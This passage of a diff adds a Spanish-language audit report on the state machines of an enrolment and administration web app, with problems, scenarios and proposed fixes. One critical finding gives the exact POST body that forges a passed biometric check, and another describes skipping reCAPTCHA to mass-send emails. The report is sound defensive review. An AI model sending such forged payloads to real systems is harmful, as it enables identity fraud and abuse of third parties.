+     "6 Pendiente de validación (id calculado como MAX(id)+1)"
+    ],
+    "prioridad": "alta",
+    "problemas": [
+     "[ALTA] app/api/verificacion/validar/[token]/route.ts:20-39 y database/add_pendiente_validacion_estado.sql:2-10: el id del estado 'Pendiente de validación' depende de los datos (LIKE 'pendiente%' o, si no existe, MAX(id)+1), mientras que lib/inscripcionStates.ts lo fija en 6. Escenario: la tabla de producción tiene un estado extra (p. ej. id 6 'Cancelado') o ids no contiguos → el estado pendiente se crea como 7 → las inscripciones manuales se guardan con 7, isValidInscripcionState(7)=false y el PUT devuelve 'Estado de inscripción inválido' para cualquier transición. La inscripción queda sin salida. Si dos validaciones llegan a la vez sin la fila creada, MAX+1 choca en la PK y da 500 con el token ya consumido. Corrección: sembrar ids fijos con INSERT ... (6,'Pendiente de validación') ON CONFLICT (id) DO NOTHING en la migración, usar la constante InscripcionState.PENDIENTE_VALIDACION en el código y añadir CHECK (estado_inscripcion BETWEEN 1 AND 6) o FK.",
+     "[MEDIA] app/api/admin/inscripciones/[id]/route.ts:46-100: la transición se valida contra el estado leído, pero el UPDATE (l.95-99) no se condiciona a ese estado y no hay historial (solo console.warn en overrides). Escenario: dos administradores abren la misma inscripción en estado 1. A la matricula (1→3) y B, con la pantalla vieja, la rechaza (1→2 es válido desde lo que leyó). El UPDATE de B pisa a A y la inscripción termina 'Rechazado' sin rastro de quién matriculó. Además, cualquier sesión isAdmin (incluido Relaciones Públicas, rol 4) puede cambiar estados. Corrección: UPDATE ... SET estado_inscripcion=$1 WHERE id=$2 AND estado_inscripcion=$3 RETURNING (409 si rowCount=0); tabla inscripciones_historial (inscripcion_id, de, a, admin_id, motivo, es_override, fecha) escrita en la misma transacción; restringir por rol. EstadoSelector debería pedir al servidor getNextInscripcionStates y mostrar el error real (esto último ya está en los pendientes conocidos)."
+    ],
+    "propuesta": "Mantener lib/inscripcionStates.ts como única fuente: exportar también TRANSICIONES_OVERRIDE y una función transicionesPermitidas(estado, rol) que use la API de listado (GET /api/admin/capacitaciones/[id]/estudiantes devolvería 'transiciones' por fila, como ya hacen las mentorías) para que la UI ofrezca solo lo válido. Crear lib/inscripcionesServer.ts con cambiarEstadoInscripcion(q, {id, de, a, adminId, motivo}) que, en una transacción, haga el UPDATE condicionado, inserte en ciepi.inscripciones_historial y devuelva 409 si hubo una carrera. La creación inicial (1 o 6) también pasa por esa función, con de=null, para que el historial empiece en la creación. En BD: ids de estados sembrados y fijos, FK o CHECK sobre estado_inscripcion, UNIQUE (id_usuario, id_capacitacion) para que la creación sea idempotente, y trigger o constraint que impida volver a estados no previstos. Ampliar tests/unit/inscripcionStates.test.ts con la tabla completa 6x6xrol (casos permitidos y prohibidos) y con la nueva función transicionesPermitidas."
+   },
+   {
+    "nombre": "Asistente de inscripción y validación biométrica (cliente)",
+    "archivos": [
+     "lib/inscripcionFlow.ts",
+     "app/capacitaciones/inscribirse/[id]/page.tsx",
+     "app/biometria/callback/page.tsx",
+     "app/api/biometria/token/route.ts",
+     "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "lib/biometria.ts",
+     "tests/unit/inscripcionFlow.test.ts"
+    ],
+    "estados_actuales": [
+     "cedula",
+     "confirmar_nacimiento",
+     "metodo (isInitiatingBiometria)",
+     "form (metodoValidacion biometrica|manual, birthDateConfirmed)",
+     "flags busy, isCheckingEmail y error en cada paso"
+    ],
+    "prioridad": "alta",
+    "problemas": [
+     "[CRÍTICA, seguridad] app/api/capacitaciones/inscribirse/[capacitacion]/route.ts:40-46 y :352-363: el resultado biométrico lo canjea /api/biometria/token y se devuelve al navegador (app/biometria/callback/page.tsx:93-106 → sessionStorage). El servidor lo acepta después tal como llega en el body: basta con biometria.valido=true y cualquier id_auditoria. Tampoco se comprueba que biometria.cedula coincida con estudiante.cedula. Escenario: un usuario envía el POST con {biometria:{valido:true,id_auditoria:'x'}, metodo_validacion:'biometrica'} → la inscripción entra en estado 1 con biometria_verificada=true y se salta 'Pendiente de validación'. O usa el resultado biométrico real de otra persona con su propia cédula. Corrección: que /api/biometria/token guarde en el servidor el resultado (tabla biometria_validaciones con id_auditoria, cédula, expiración y un nonce de un solo uso) y que inscribirse solo reciba ese nonce y verifique cédula, estado APROBADO, que no haya caducado y que no se haya usado antes.",
+     "[ALTA] lib/inscripcionFlow.ts:109-117 + app/capacitaciones/inscribirse/[id]/page.tsx:111-116 y 517-528: BIOMETRIA_RETURN se acepta desde cualquier estado y salta directo a 'form', pero el estado del reducer en 'form' no guarda la cédula ni el estudiante, y la página no vuelve a cargar estudianteData después de la redirección (setEstudianteData solo se llama en l.421 y l.943). Escenario: el estudiante existente vuelve del Hub con la biometría aprobada → la página se monta de nuevo, estudianteData=null → el payload lleva estudiante.id=undefined y cedula=undefined → el servidor lo trata como estudiante nuevo y responde 409 'Correo duplicado'/'Cédula duplicada', o intenta insertar un estudiante sin cédula. La inscripción biométrica no se puede completar. Por el mismo motivo, BACK_TO_METODO desde 'form' (l.133-142) deja cedula:'' en el estado. Corrección: guardar cedula, estudianteId e isExistingStudent dentro del estado 'form' del reducer; tras BIOMETRIA_RETURN, pasar por un paso 'rehidratando' que llame a /api/verificar/[cedula]; exigir step==='metodo' && isInitiatingBiometria para aceptar BIOMETRIA_RETURN (o un estado 'esperando_hub' persistido)."
+    ],
+    "propuesta": "Convertir el reducer en una máquina completa y serializable: cedula → confirmar_nacimiento → metodo → esperando_hub (persistido en sessionStorage con capacitacionId y cédula) → rehidratando → form → enviando → esperando_correo. Cada estado lleva los datos que necesita (cédula y estudianteId viajan en el estado, no en useState sueltos), y las acciones inválidas para el paso actual se ignoran (BIOMETRIA_RETURN solo desde esperando_hub y con la misma capacitación y cédula). En el servidor, la biometría se modela como su propia máquina persistida: iniciada (state+PKCE) → canjeada (resultado guardado en el servidor) → consumida (al crear el token de verificación). El cliente solo maneja un id opaco. Tests: añadir a tests/unit/inscripcionFlow.test.ts casos de 'acción no permitida en este paso' para cada acción, y un test de que form conserva la cédula y el estudianteId."
+   },
+   {
+    "nombre": "Blog (1 Borrador, 2 Revisión CIEPI, 3 Rechazado CIEPI, 4 Revisión RP, 5 Rechazado RP, 6 Publicado)",
+    "archivos": [
+     "lib/permissions.ts",
+     "app/api/admin/blog/route.ts",
+     "app/api/admin/blog/[id]/route.ts",
+     "database/create_blogs_table.sql",
+     "app/admin/blog/aprobar/[id]/page.tsx",
+     "tests/unit/permissions.test.ts"
+    ],
+    "estados_actuales": [
+     "1 Borrador",
+     "2 En Revisión CIEPI",
+     "3 Rechazado por CIEPI",
+     "4 En Revisión Relaciones Públicas",
+     "5 Rechazado por RP",
+     "6 Publicado (sin salida salvo override de rol 1/2)"
+    ],
+    "prioridad": "alta",
+    "problemas": [
+     "[ALTA] lib/permissions.ts:63-72 y :116 + app/api/admin/blog/[id]/route.ts:150-187: la regla de 'solo puede cambiar si es su blog (verificado en otra parte)' no se comprueba en ningún sitio. Para cambiar el estado no se mira isCreator ni se exige que el revisor sea distinto del autor. Escenario: un autor con rol CIEPI (3) crea su entrada con estado 2 y luego hace PUT {estado:4} → aprueba su propio texto y lo manda a RP sin revisión CIEPI independiente. Además, cualquier usuario de rol 3 puede mover entradas ajenas (p. ej. rechazarlas, 2→3). Al revés: el creador puede editar el contenido de una entrada en estado 4 o 6 (l.152, solo se comprueba isCreator) y el texto publicado cambia sin volver a revisión. Corrección: en validateBlogStateTransition, recibir también {esCreador}; exigir revisor≠autor en 2→3|4 y 4→5|6; en el PUT, prohibir cambios de contenido salvo en 1/3/5, o forzar estado=1 (o 2) cuando se edita una entrada en 4 o 6.",
+     "[MEDIA] database/create_blogs_table.sql:35-47 y :67 + app/api/admin/blog/[id]/route.ts:192-197, 254: ciepi.set_comentario_estado declara p_blog_id INT, pero blogs.id es UUID, y la función usa temp_blog_comentarios sin esquema. Escenario: cuando se corrija el pendiente conocido de que aprobar/[id] envíe comentario_temp, cada aprobación o rechazo con comentario dará 500 ('function ciepi.set_comentario_estado(uuid, unknown) does not exist' o 'relation temp_blog_comentarios does not exist'). Además, la tabla temporal es global (sin sesión ni transacción), el UPDATE no se condiciona al estado leído (dos revisores pueden aprobar y rechazar a la vez y gana el último) y el historial registra 'cambiado_por' = aprobado_por, que también se rellena cuando el autor solo envía a revisión. Corrección: quitar la tabla temporal y el trigger de comentario; registrar el cambio en ciepi.blog_historial (blog_id, de, a, actor_id, comentario, fecha) dentro de una transacción con UPDATE ... WHERE id=$1 AND estado=$actual."
+    ],
+    "propuesta": "lib/estados/blog.ts (separado de permissions.ts) con un mapa de transiciones etiquetadas: {de, a, accion:'enviar'|'aprobar_ciepi'|'rechazar_ciepi'|'publicar'|'rechazar_rp'|'reabrir'|'despublicar', roles, requiereComentario, revisorDistintoDelAutor}. Una función pura puedeTransicionar(blog, actor) devuelve las acciones posibles y la API las incluye en el GET para que aprobar/[id] y la tabla muestren solo botones válidos. Este cambio resuelve también los pendientes de 'Gestionar aprobación' y 'Reenviar a revisión'. La edición de contenido es otra transición (editar), permitida solo en 1/3/5. En 4/6 crea una revisión nueva o devuelve a 1. Hay que añadir una transición explícita 6→1 'despublicar' para que Publicado no sea un callejón sin salida que obliga al override. Servidor: cambiarEstadoBlog(q, id, de, accion, actor, comentario) con UPDATE condicionado más un INSERT en blog_historial en la misma transacción. Eliminar historial_estados JSONB y el trigger, o dejarlos solo como vista materializada. Los tests de permissions.test.ts deben cubrir el caso de autoaprobación y la edición en estado 6."
+   },
+   {
+    "nombre": "Consultas de contacto (pendiente / en_proceso / respondida / cerrada)",
+    "archivos": [
+     "app/api/admin/consultas/[id]/route.ts",
+     "app/admin/consultas/page.tsx",
+     "database/create_consultas_table.sql"
+    ],
+    "estados_actuales": [
+     "pendiente",
+     "en_proceso",
+     "respondida",
+     "cerrada"
+    ],
+    "prioridad": "media",
+    "problemas": [
+     "[MEDIA] app/admin/consultas/page.tsx:65 y :88-91 + app/api/admin/consultas/[id]/route.ts:126-145: no hay grafo de transiciones (cualquier estado pasa a cualquier otro) y la UI siempre envía estado = el estado actual precargado. Por eso nunca se cumple la regla del servidor de 'si se responde y no se especifica estado → respondida' (l.136). Escenario: un administrador abre una consulta 'pendiente', escribe la respuesta y pulsa Enviar → toast 'Respuesta enviada exitosamente', pero la consulta sigue 'pendiente' y aparece como no atendida en los filtros. Además: estado='' pasa la validación (l.109 usa estado &&) y el CHECK de la BD da 500; para cerrar una consulta hay que reenviar la respuesta, lo que sobrescribe respuesta, respondido_por y fecha_respuesta sin historial; una consulta 'cerrada' puede volver a 'pendiente'. Corrección: mapa {pendiente:['en_proceso','respondida','cerrada'], en_proceso:['respondida','cerrada'], respondida:['cerrada','en_proceso'], cerrada:[]}; responder es una acción que solo se permite desde pendiente o en_proceso y fuerza respondida; separar el endpoint de cambio de estado del de respuesta; UPDATE ... WHERE estado=$actual."
+    ],
+    "propuesta": "lib/estados/consulta.ts con TRANSICIONES y acciones ('tomar' → en_proceso, 'responder' → respondida, que envía el correo pendiente del TODO, 'cerrar', 'reabrir' solo para admin). La API devuelve transiciones por fila y la UI muestra botones en vez de un select libre. Tabla ciepi.consultas_respuestas (consulta_id, respuesta, admin_id, fecha) para no perder respuestas anteriores, más consultas_historial para los cambios de estado. El UPDATE se condiciona al estado leído y responde 409 si hubo una carrera. Tests unitarios del mapa y de la regla 'responder ⇒ respondida'."
+   },
+   {
+    "nombre": "Reservas de mentoría (pendiente_verificacion / confirmada / completada / no_asistio / cancelada_usuario / cancelada_ciepi / expirada)",
+    "archivos": [
+     "lib/mentorias.ts",
+     "lib/mentoriasServer.ts",
+     "app/api/mentorias/reservas/route.ts",
+     "app/api/mentorias/reservas/gestion/route.ts",
+     "app/api/admin/mentorias/reservas/[id]/route.ts",
+     "app/api/admin/mentorias/mentores/[id]/route.ts",
+     "app/api/cron/mentorias-recordatorios/route.ts",
+     "database/create_mentorias.sql",
+     "tests/unit/mentorias.test.ts"
+    ],
+    "estados_actuales": [
+     "pendiente_verificacion (con pendiente_expira; vista 'expirada' derivada)",
+     "expirada",
+     "confirmada",
+     "completada",
+     "no_asistio",
+     "cancelada_usuario",
+     "cancelada_ciepi"
+    ],
+    "prioridad": "media",
+    "problemas": [
+     "[MEDIA] app/api/admin/mentorias/mentores/[id]/route.ts:90-96 (y app/api/admin/profesores/[id]/route.ts:40, donde activo vale true por defecto si no llega como booleano): desactivar a un mentor (es_mentor=false o activo=false) no tiene en cuenta sus reservas 'confirmada' o 'pendiente_verificacion' futuras. Escenario: se desactiva un mentor con tres citas confirmadas para la semana → siguen confirmadas, el cron envía recordatorios de 24 h y el ciudadano acude a una cita que nadie atenderá. Una reserva pendiente todavía se puede confirmar desde el enlace (gestion/route.ts:59-63 no comprueba si el mentor está activo). Corrección: al desactivar, bloquear con 409 si hay reservas activas, o cancelarlas como 'cancelada_ciepi' con motivo y correo dentro de la misma transacción; añadir 'AND EXISTS (mentor activo)' al UPDATE de confirmación. Detalle relacionado: gestion/route.ts:101 envía el correo de cancelación fuera de try, así que si falla el SMTP el usuario recibe 500 aunque la cancelación ya quedó guardada, y al reintentar ve 'ya no se puede cancelar'."
+    ],
+    "propuesta": "Es la máquina mejor resuelta y conviene usarla como plantilla: transiciones puras en lib/mentorias.ts (transicionesAdminReserva, ya testeada), API que devuelve 'transiciones' por fila, UPDATE ... WHERE estado=$actual con 409, índice único parcial sobre los estados activos y cron idempotente. Faltan: (1) una tabla mentoria_reservas_historial (reserva_id, de, a, actor 'ciudadano'|'admin:<id>'|'cron', motivo, fecha), porque hoy el motivo se concatena en notas_admin y el ir y venir completada↔no_asistio no deja rastro; (2) incluir las transiciones del ciudadano y del cron en el mismo módulo (transicionesCiudadano, expirarPendientes) para que todo el grafo viva en un archivo; (3) que el PATCH del admin haga todos sus cambios (notas, enlace, estado) en una sola transacción, ya que hoy notas y enlace se guardan aunque la transición luego falle con 409; (4) que el cron vuelva a comprobar estado='confirmada' al cargar cada reserva antes de enviar el recordatorio."
+   },
+   {
+    "nombre": "Suscriptores del newsletter (pendiente / activo / baja)",
+    "archivos": [
+     "app/api/newsletter/suscribir/route.ts",
+     "app/api/newsletter/confirmar/[token]/route.ts",
+     "app/api/newsletter/baja/[token]/route.ts",
+     "lib/newsletter.ts",
+     "database/create_newsletter_tables.sql",
+     "tests/unit/newsletter.test.ts"
+    ],
+    "estados_actuales": [
+     "pendiente (con confirm_token_hash y expiración de 24 h)",
+     "activo",
+     "baja"
+    ],
+    "prioridad": "baja",
+    "problemas": [
+     "[BAJA] app/api/newsletter/suscribir/route.ts:76-107 y :59-67: la lectura del estado existente y el UPDATE posterior no son atómicos, y el UPDATE no se condiciona (WHERE id=$6). Escenario: un suscriptor 'pendiente' confirma desde el correo mientras otra pestaña o un bot reenvía el formulario → el UPDATE devuelve la fila a 'pendiente' con un token nuevo y deja de recibir el boletín. Dos altas simultáneas del mismo correo nuevo dan 500 por la restricción UNIQUE. Además, reCAPTCHA solo se valida si el cliente envía recaptchaToken (l.59), así que omitirlo permite enviar correos de confirmación en masa a terceros. Corrección: INSERT ... ON CONFLICT (email) DO UPDATE ... WHERE newsletter_suscriptores.estado <> 'activo'; exigir el captcha cuando RECAPTCHA_SECRET_KEY está configurada; guardar los eventos de consentimiento y baja en una tabla aparte por la Ley 81."
+    ],
+    "propuesta": "Máquina sencilla y bien orientada (confirmar ya usa WHERE estado='pendiente'). Para completarla: lib/estados/newsletter.ts con {pendiente:['activo','baja'], activo:['baja'], baja:['pendiente']}; todas las escrituras como UPSERT o UPDATE condicionados; tabla newsletter_eventos (suscriptor_id, de, a, ip, version_politica, fecha) como registro auditable de consentimiento y baja, en vez de sobrescribir fecha_consentimiento e ip_consentimiento en cada alta."
+   },
+   {
+    "nombre": "Estado de evento derivado de fechas (futuro / en-curso / pasado) y capacitación activa / ventana de inscripción",
+    "archivos": [
+     "components/EventoCard.tsx",
+     "components/EventoCountdown.tsx",
+     "app/eventos/page.tsx",
+     "app/api/eventos/route.ts",
+     "app/api/admin/eventos/route.ts",
+     "app/api/admin/eventos/[id]/route.ts",
+     "app/api/admin/capacitaciones/[id]/route.ts",
+     "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts"
+    ],
+    "estados_actuales": [
+     "Evento: futuro | en-curso | pasado (derivado en el cliente, con tres implementaciones duplicadas)",
+     "Capacitación: activo boolean, combinado con fecha_inicio_inscripcion y fecha_final_inscripcion → 'inscripciones abiertas' (derivado solo en inscribirse)"
+    ],
+    "prioridad": "baja",
+    "problemas": [
+     "[BAJA] app/api/admin/eventos/route.ts:109-110 y app/api/admin/eventos/[id]/route.ts:145: fecha_fin puede ser null o anterior a fecha_inicio sin validación, y el estado se deriva en el cliente con new Date(evento.fecha_fin) (components/EventoCard.tsx:27-33, app/eventos/page.tsx:62-70). Escenario: se crea un evento futuro sin fecha de fin → new Date(null) es 1970 → se muestra como 'Pasado', queda fuera del filtro 'Próximos' y la cuenta atrás no aparece. La API documenta un filtro ?estado= que no implementa (app/api/eventos/route.ts:10), y el filtrado en el cliente se aplica después del LIMIT 100. Corrección: validar fecha_fin >= fecha_inicio en la API y en la BD (CHECK) y derivar el estado en un único helper puro testeado (lib/eventoEstado.ts), usado por API y UI; implementar el filtro en SQL."
+    ],
+    "propuesta": "Las máquinas derivadas no deben guardar estado, pero sí tener una única función pura: estadoEvento(inicio, fin, ahora) y estadoInscripcionCapacitacion({activo, fecha_inicio_inscripcion, fecha_final_inscripcion}, ahora) → 'cerrada'|'proxima'|'abierta'|'finalizada', con tests de bordes (null, fin<inicio, zona horaria de Panamá). Se usa en la API pública (que devuelve el estado calculado), en la UI y en el servidor de inscripción. La misma comprobación debe repetirse al canjear el token de verificación (validar/[token]), porque hoy una capacitación desactivada o cerrada sigue aceptando inscripciones durante los 15 minutos del token. En BD: CHECK (fecha_fin IS NULL OR fecha_fin >= fecha_inicio) en eventos y CHECK (fecha_final_inscripcion >= fecha_inicio_inscripcion) en capacitaciones."
+   }
+  ],
+  "patron_comun": "Un patrón único para las 8 máquinas, tomando como modelo la de reservas de mentoría, que es la que mejor está resuelta:\n\n1. **Módulo puro por máquina** en lib/estados/<maquina>.ts, sin acceso a BD:\n   - Contenido: el tipo de estado (unión de literales o enum con ids fijos), un mapa TRANSICIONES: Record<Estado, {a: Estado, accion: string, roles?: Role[], requiereMotivo?: boolean, guarda?: (ctx) => boolean}[]>, y las funciones transicionesPermitidas(estado, ctx) y validarTransicion(de, a, ctx) → {ok} | {ok: false, status, motivo}.\n   - El contexto lleva rol, esCreador, ahora y los datos que necesiten las guardas (fechas, revisor ≠ autor).\n   - Los overrides de administrador se declaran en el mismo mapa con override: true, no como excepciones sueltas.\n   - Ningún id de estado se calcula a partir de datos (eliminar LIKE 'pendiente%' y MAX(id)+1).\n\n2. **Tests** en tests/unit/estados/<maquina>.test.ts, generados a partir de la matriz completa estados × estados × roles:\n   - Cada celda debe dar el resultado esperado.\n   - Ningún estado no final debe quedar sin salida.\n   - Todo estado debe ser alcanzable desde el inicial.\n   - Las acciones no válidas en un paso deben ignorarse (en los reducers de cliente).\n   - Hay que ampliar con este patrón los tests existentes: inscripcionStates, permissions, inscripcionFlow y mentorias.\n\n3. **Servidor**: una única función de escritura por máquina, cambiarEstadoX(q, {id, de, a, actor, motivo}), que corre dentro de withTransaction y hace:\n   - UPDATE tabla SET estado=$a, actualizado_en=NOW() WHERE id=$id AND estado=$de RETURNING *. Si rowCount = 0, responde 409 «cambió mientras lo editabas».\n   - INSERT en <tabla>_historial (entidad_id, estado_de, estado_a, actor_tipo, actor_id, motivo, es_override, ip, creado_en).\n   - Los efectos secundarios (correos) se ejecutan después del COMMIT, en try/catch, y se devuelven como 'avisos', igual que en mentorías.\n\n   Ninguna ruta escribe la columna estado directamente. Un grep de \"SET estado\" fuera de esos módulos se puede añadir como test o regla de lint.\n\n4. **La API expone las transiciones**: el GET de cada entidad devuelve transiciones: transicionesPermitidas(estado, ctx), y la UI solo pinta esos botones (EstadoSelector, aprobar blog, consultas). La UI nunca decide qué es válido por su cuenta y siempre muestra el error del servidor.\n\n5. **Restricciones en BD como red de seguridad**:\n   - CHECK o FK de estado con ids sembrados y fijos.\n   - Índices únicos parciales para las invariantes: una inscripción por (id_usuario, id_capacitacion), un token pendiente por (estudiante, tipo), una reserva activa por (mentor, inicio).\n   - CHECK de coherencia de fechas.\n   - Opcionalmente, un trigger BEFORE UPDATE que rechace pares (OLD.estado, NEW.estado) que no estén en una tabla <maquina>_transiciones sembrada desde el mismo mapa.\n\n6. **Nada de estado de seguridad que venga del cliente**: los resultados de terceros (biometría) y la metadata de los tokens se guardan en el servidor y el cliente solo maneja ids opacos de un solo uso.\n\n7. **Orden sugerido antes de producción**:\n   - Tokens de verificación: separar 'usado' de 'invalidado', arreglar el reenvío y hacer el canje transaccional.\n   - Biometría: persistirla en el servidor y rehidratar los datos tras BIOMETRIA_RETURN.\n   - Ids fijos de los estados de inscripción y UPDATE condicionado.\n   - Autoaprobación y edición de entradas publicadas en el blog.\n   - Consultas.\n   - Resto de mejoras.\n\nEstado actual de los tests: npx vitest run de inscripcionStates, permissions, inscripcionFlow y mentorias da 54/54 en verde, pero ninguno cubre las carreras, la invalidación de tokens ni la autoaprobación descritas arriba."
+ }
+}
